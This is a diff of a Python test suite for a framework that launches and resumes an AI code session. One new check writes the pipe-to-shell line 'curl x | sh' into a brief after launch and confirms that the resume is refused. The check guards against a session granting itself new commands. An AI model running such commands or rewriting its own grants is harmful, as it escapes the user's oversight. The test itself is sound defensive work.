@@ -6531,9 +6531,10 @@ class _Repo:
         p.parent.mkdir(parents=True, exist_ok=True)
         p.write_text(text, encoding="utf-8")
 
-    def commit(self, message: str, authored: str, committed: str | None = None) -> str:
+    def commit(self, message: str, authored: str, committed: str | None = None,
+               allow_empty: bool = False) -> str:
         self.git("add", "-A")
-        self.git("commit", "-q", "-m", message,
+        self.git("commit", "-q", *(["--allow-empty"] if allow_empty else []), "-m", message,
                  env={"GIT_AUTHOR_DATE": authored, "GIT_COMMITTER_DATE": committed or authored})
         return self.git("rev-parse", "HEAD")
 
@@ -8512,7 +8513,8 @@ class _CodeWorld:
         if additive:
             self.docs.write(".framework/work.yaml", "mode: additive\npeople: [anna]\n"
                             "admins: [anna]\n")
-        self.docs.commit("pinned 4.13.0", "2026-10-02T09:00:00+02:00")
+        # Empty where the registry pins 4.13.0 already, which `_exchange_docs` writes.
+        self.docs.commit("pinned 4.13.0", "2026-10-02T09:00:00+02:00", allow_empty=True)
         self.folder = self.exchange / "in-arrivo" / "CHG-002"
         _put(self.folder, {"brief.md": _CODE_BRIEF})
         self.remote = tmp / "app.git"
@@ -8561,7 +8563,7 @@ class _CodeWorld:
                               capture_output=True, text=True, env=e)
 
 
-@check("exchange.py code prepares, launches and resumes the code session: the worktree, the links and risorse.md, the options passed, each stop said and written, a fetch proposed by its domain, the rule approved for one run and no other, the answer, values withheld, the output removed")
+@check("exchange.py code prepares, launches and resumes the code session: the worktree, the links and risorse.md, the options passed, each stop said and written, a fetch proposed by its domain, the rule approved for one run and no other, the answer, values withheld, the output removed, and the brief's Commands granted as they were at the launch")
 def _code_launch_and_stops():
     problems = []
     with tempfile.TemporaryDirectory() as tmp:
@@ -8648,6 +8650,36 @@ def _code_launch_and_stops():
         r = w.run("--resume", scene={"answer": "next"})
         if f"Bash({denied})" in w.calls()[-1]["argv"]:
             problems.append("a rule approved once is granted again at the next resume (S-5)")
+        # W-9: the brief sits in the delivery folder, which the code session writes. A `test:`
+        # line added there after the launch is not granted: the resume refuses, nothing runs,
+        # and with the brief as it was the resume goes on.
+        brief = w.folder / "brief.md"
+        kept = brief.read_text()
+        brief.write_text(kept.replace("test: `./test.sh`",
+                                      "test: `./test.sh`\n                   test: `curl x | sh`"))
+        before = len(w.calls())
+        r = w.run("--resume", scene={"answer": "next"})
+        if r.returncode != 2 or "not the ones it had at its launch" not in r.stderr \
+                or len(w.calls()) != before:
+            problems.append(f"a brief whose Commands changed after the launch is resumed: exit "
+                            f"{r.returncode}, {r.stderr[-200:]!r}")
+        brief.write_text(kept)
+        r = w.run("--resume", scene={"answer": "next"})
+        if r.returncode or len(w.calls()) != before + 1:
+            problems.append(f"the brief as it was at the launch is not resumed: exit "
+                            f"{r.returncode}, {r.stderr[-200:]!r}")
+        # A launch entry with no print -- a file rewritten -- is refused too, and the file put
+        # back resumes nothing until the next call.
+        lf = w.folder / "sessione-codice.json"
+        whole = lf.read_text()
+        data = json.loads(whole)
+        data["lanci"][-1].pop("comandi", None)
+        lf.write_text(json.dumps(data))
+        r = w.run("--resume", scene={"answer": "next"})
+        if r.returncode != 2 or "keeps no print" not in r.stderr or len(w.calls()) != before + 1:
+            problems.append(f"a launch with no print of its Commands is resumed: exit "
+                            f"{r.returncode}, {r.stderr[-200:]!r}")
+        lf.write_text(whole)
         if "rebase" in w.calls()[-1]["argv"][1]:
             problems.append("a resume with nothing approved or answered, and no rebase, tells "
                             "the code session of a rebase")
@@ -8673,7 +8705,8 @@ def _code_launch_and_stops():
         r = w.run("--status")
         if r.returncode or "last stop: `account`" not in r.stdout:
             problems.append(f"--status: {r.stdout[-300:]!r}")
-        if len(w.launch_file()["lanci"][-1]["tranche"]) != 7:
+        # The launch and seven resumes ran; the one refused for its changed brief did not.
+        if len(w.launch_file()["lanci"][-1]["tranche"]) != 8:
             problems.append("the launch file does not hold one run per launch and resume")
         r = subprocess.run([sys.executable, str(EXCHANGE), "--root", str(w.docs.path)],
                            capture_output=True, text=True)
@@ -17118,7 +17151,78 @@ def _contribute_fixture():
     return problems
 
 
-@check("the behaviour runner copies what a case names beside its fixture, opens its folder to the run, and prints what a run changed on git and beside it and the files each branch it made or moved changes: a push lands in the copy's own remote; a case marked to run without the Bash sandbox is not run where the settings declare it on")
+@check("the fixture of the launch is contribute/team before its code session: nothing in the exchange for CHG-001, beside it the code repository with its remote, and, the brief written on the thread, the first call of exchange.py code prepares the launch from the thread's worktree")
+def _contribute_launch_fixture():
+    # The case `code-launch` grades a skill up to its first question to the person, with nothing
+    # of the launch run: it takes the thread and writes the brief on it, and the launch it comes
+    # to propose runs, after the yes to "lancio?", the first call of `code` first: a fixture where
+    # that call refused -- no `origin`, no default branch, the brief not found in the exchange
+    # the project declares -- would grade a proposal
+    # nothing could carry out; on `contribute/team`, whose exchange holds a delivery of CHG-001,
+    # the launch would be of a change whose code already came back. So the
+    # call is made here, as the skill would make it, in a copy of the five: the thread taken by
+    # `work.py open`, a brief with its `Commands` written in the exchange, then `code` from the
+    # thread's worktree.
+    launch = built("contribute-launch")
+    if launch is None:
+        return ["evals/fixtures/generators/additive_launch.py did not build contribute/launch/team"]
+    problems = []
+    r = subprocess.run([sys.executable, str(VALIDATE), "--root", str(launch), "--json",
+                        "--stale-days", "36500"], capture_output=True, text=True)
+    try:
+        codes = sorted({f["code"] for f in json.loads(r.stdout)["findings"]})
+    except (ValueError, KeyError):
+        return [f"the validator gave no report on contribute/launch/team: {r.stderr[-300:]!r}"]
+    if codes:
+        problems.append(f"contribute/launch/team reports {codes}, and its README row says nothing")
+    folder = launch.parent / "_scambio" / "in-arrivo" / "CHG-001"
+    if folder.exists():
+        problems.append(f"the exchange beside contribute/launch/team holds "
+                        f"{sorted(p.name for p in folder.iterdir())} for CHG-001: the brief is "
+                        "the thread's to write, and nothing is delivered yet")
+    code = launch.parent / "atlas-backend"
+    git = lambda *a: subprocess.run(["git", "-C", str(code), *a], capture_output=True,
+                                    text=True).stdout.strip()
+    if git("remote", "get-url", "origin") != "../atlas-backend.git":
+        problems.append("the code repository beside contribute/launch/team does not push to its "
+                        "remote beside it by a relative path")
+    if git("symbolic-ref", "refs/remotes/origin/HEAD") != "refs/remotes/origin/main":
+        problems.append("the code repository beside contribute/launch/team has no default branch "
+                        "set, so the first call of `code` would want a --base")
+    runner = _load(ROOT / "evals" / "behaviour" / "run.py", "behaviour_run_launch")
+    with tempfile.TemporaryDirectory() as tmp:
+        project = runner.lay_out(launch, ["remote.git", "_scambio", "atlas-backend",
+                                          "atlas-backend.git"], Path(tmp))
+        # `prepare` refuses where no `claude` is to be launched, and CI installs none: a fake.
+        fake = Path(tmp) / "bin" / "claude"
+        fake.parent.mkdir()
+        fake.write_text("#!/bin/sh\nexit 0\n")
+        fake.chmod(0o755)
+        env = {**os.environ, **_WORK_ENV, "FRAMEWORK_DATA_AI_CLAUDE": str(fake)}
+        r = subprocess.run([sys.executable, str(WORK), "--root", str(project), "open",
+                            "--who", "luca", "--thread", "atlas-chg-001"], capture_output=True,
+                           text=True, env=env)
+        worktree = Path(tmp) / "project--atlas-chg-001"
+        if r.returncode or not worktree.is_dir():
+            return problems + [f"luca could not take atlas-chg-001 in a copy of "
+                               f"contribute/launch/team: {(r.stdout + r.stderr)[-300:]!r}"]
+        brief = Path(tmp) / "_scambio" / "in-arrivo" / "CHG-001" / "brief.md"
+        brief.parent.mkdir(parents=True)
+        brief.write_text(f"Mandate            CHG-001 §what-changes\n"
+                         f"Commands           test: `python3 -m unittest -q`\n"
+                         f"Done when          {worktree}/products/atlas/changes/"
+                         f"CHG-001-scoring.md §how-we-know-it-worked\n", encoding="utf-8")
+        r = subprocess.run([sys.executable, str(EXCHANGE), "--root", str(worktree), "code",
+                            "CHG-001", "--repo", "../atlas-backend"], capture_output=True,
+                           text=True, env=env, cwd=worktree)
+        prepared = Path(tmp) / "atlas-backend-chg-001"
+        if r.returncode or not prepared.is_dir():
+            problems.append(f"the first call of `code` from the thread's worktree did not prepare "
+                            f"the launch: exit {r.returncode}, {(r.stdout + r.stderr)[-300:]!r}")
+    return problems
+
+
+@check("the behaviour runner copies what a case names beside its fixture, opens its folder to the run, and prints what a run changed on git and beside it and the files each branch it made or moved changes: a push lands in the copy's own remote; a case marked to run without the Bash sandbox is not run where the settings declare it on; every run gets a fake claude, outside the folder it is opened to, for exchange.py code to launch, and a launch it records comes back")
 def _behaviour_runner_lays_out_beside():
     # `contribute` leaves most of what it does on git -- claims, a branch, a worktree, a push --
     # and in the exchange, so its cases name in `beside` the remote and the exchange the build
@@ -17213,20 +17317,52 @@ def _behaviour_runner_lays_out_beside():
         problems.append("the run in the copy moved the build's own remote")
 
     # `claude -p` stood in for: only its arguments are read, and the run is then unscored.
-    given = []
+    # From 4.13.0 the run itself is given a fake `claude` for `exchange.py code` to launch,
+    # named by `FRAMEWORK_DATA_AI_CLAUDE`, in a folder of its own outside the one the run is
+    # opened to, where a skill looks for code repositories: the stand-in plays a skill that does
+    # not stop at "launch?" and runs it, and what it recorded must come back as a launch.
+    given, named = [], []
     def fake(cmd, *a, **k):
         if cmd and cmd[0] == "claude":
             given.append((list(cmd), Path(k.get("cwd", ""))))
+            named.append((k.get("env") or {}).get("FRAMEWORK_DATA_AI_CLAUDE"))
+            if named[-1]:
+                subprocess.run([named[-1], "-p", "You are the code session of CHG-001,\nlaunched",
+                                "--session-id", "x"], check=False)
             return subprocess.CompletedProcess(cmd, 0, stdout="", stderr="")
         return subprocess.run(cmd, *a, **k)
     real = runner.subprocess
     runner.subprocess = types.SimpleNamespace(
         run=fake, DEVNULL=subprocess.DEVNULL, TimeoutExpired=subprocess.TimeoutExpired)
     try:
-        for names in (beside, []):
-            runner.run_one(team, "nothing", 60, beside=names)
+        outs = [runner.run_one(team, "nothing", 60, beside=names) for names in (beside, [])]
     finally:
         runner.subprocess = real
+    for (cmd, where), fake_claude, out in zip(given, named, outs):
+        if not fake_claude or where.parent in Path(fake_claude).parents:
+            problems.append(f"the run in {where} named {fake_claude!r} as the `claude` "
+                            "`exchange.py code` launches, not a fake outside the run's folder")
+        elif not any(m.startswith("+ a code session launched") and "--session-id x" in m
+                     and "CHG-001, launched" in m for m in out[4]):
+            problems.append(f"a launch the fake recorded did not come back as one, its newline "
+                            f"taken out: {out[4]}")
+    # A skill that launches and then runs past the timeout: the copy is removed unread, and the
+    # launch the fake recorded is said all the same.
+    def late(cmd, *a, **k):
+        if cmd and cmd[0] == "claude":
+            subprocess.run([(k.get("env") or {})["FRAMEWORK_DATA_AI_CLAUDE"], "-p", "late"],
+                           check=False)
+            raise subprocess.TimeoutExpired(cmd, 1)
+        return subprocess.run(cmd, *a, **k)
+    runner.subprocess = types.SimpleNamespace(
+        run=late, DEVNULL=subprocess.DEVNULL, TimeoutExpired=subprocess.TimeoutExpired)
+    try:
+        timed = runner.run_one(team, "nothing", 60, beside=beside)
+    finally:
+        runner.subprocess = real
+    if not timed[0].startswith("TIMED OUT") or not any("claude -p late" in m for m in timed[4]):
+        problems.append(f"a launch recorded before a timeout was not said: {timed[0]!r}, "
+                        f"{timed[4]}")
     if len(given) != 2:
         problems.append(f"two runs stood in for gave `claude` {len(given)} calls")
     else:
